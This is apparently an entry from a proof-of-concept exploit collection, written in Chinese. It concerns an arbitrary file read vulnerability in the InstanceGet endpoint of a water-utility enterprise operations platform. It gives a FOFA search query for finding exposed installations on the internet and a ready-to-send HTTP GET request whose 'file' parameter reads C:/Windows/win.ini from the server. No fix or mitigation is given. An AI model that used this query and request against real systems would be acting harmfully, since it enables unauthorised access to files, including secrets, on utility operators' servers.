# 森鑫炬水务企业综合运营平台 InstanceGet 存在任意文件读取

## fofa
```
title="森鑫炬水务企业综合运营平台 - S8" || (body="Content/easyui.css" && body="重庆森鑫炬科技有限公司")
```

## poc
```javascript
GET /Forms/Instance/Get?file=C:/Windows/win.ini HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```
